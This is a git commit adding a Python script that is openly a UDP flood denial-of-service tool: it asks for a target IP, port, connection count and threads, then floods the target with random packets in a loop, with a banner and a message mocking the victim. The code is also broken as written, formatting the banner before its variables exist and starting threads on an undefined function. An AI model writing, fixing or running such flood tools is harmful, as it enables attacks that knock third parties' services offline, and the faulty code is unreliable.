b85f5fea852a7ae6611d738deb3daf6471f4ac43
NazwanJelek <104500303+NazwanJelek@users.noreply.github.com>
2022-06-13 17:57:30 +0700

    Create y.py

---
+++ y.py
@@ -0,0 +1,50 @@
+import os
+import sys
+import time
+import socket
+import random
+import threading
+
+# Clear
+def clear():
+	os.system('cls' if os.name=='nt' else 'clear')
+
+banner = """
+\033[91m╔════════════════════════════════════════╗
+\033[91m║ \033[33m┏━━━┓┏┓╋┏┓╋╋╋╋╋╋┏┓╋╋╋╋╋╋┏┳━━━┓╋╋╋╋╋┏┓   \033[91m ║
+\033[91m║ \033[33m┃┏━┓┣┛┗┳┛┗┓╋╋╋╋╋┃┃╋╋╋╋╋╋┃┃┏━┓┃╋╋╋╋┏┛┗┓ \033[91m║
+\033[91m║ \033[33m┃┃╋┃┣┓┏┻┓┏╋━━┳━━┫┃┏┳━━┳━┛┃┗━━┳━━┳━╋┓┏┛ \033[91m║
+\033[91m║ \033[33m┃┗━┛┃┃┃╋┃┃┃┏┓┃┏━┫┗┛┫┃━┫┏┓┣━━┓┃┃━┫┏┓┫┃   \033[91m ║
+\033[91m║ \033[33m┃┏━┓┃┃┗┓┃┗┫┏┓┃┗━┫┏┓┫┃━┫┗┛┃┗━┛┃┃━┫┃┃┃┗┓ \033[91m║
+\033[91m║ \033[33m┗┛╋┗┛┗━┛┗━┻┛┗┻━━┻┛┗┻━━┻━━┻━━━┻━━┻┛┗┻━┛ \033[91m║
+\033[91m╚════════════════════════════════════════╝
+\033[91m╔══════════════════╦════════════════════╗
+\033[91m║ Remake By Xenju        ║ Tools Build At 15/5/2022.         ║
+\033[91m╚══════════════════╩════════════════════╝
+\033[91m[ # ] ATTACKED TO IP \033[33m{}\033[91m AND PORT \033[33m{}\033[0m""".format(ip, port)
+
+# Launch DDoS
+clear()
+ip = str(input("\033[91m[ ✿ ] IP >> "))
+port = int(input("\033[91m[ ✿ ] PORT >> "))
+times = int(input("\033[91m[ ✿ ] CONNECTIONS >> "))
+threads = int(input("\033[91m[ ✿ ] THREADS >> "))
+print(banner)
+
+def ddos():
+	data = random._urandom(818)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				s.sendto(data,addr)
+				s.sendto(data,addr)
+				s.sendto(data,addr)
+		except:
+			print("[ # ] Down Kah Dek?? Sksksks...")
+
+for y in range(threads):
+    th = threading.Thread(target = run)
+    th.start() 
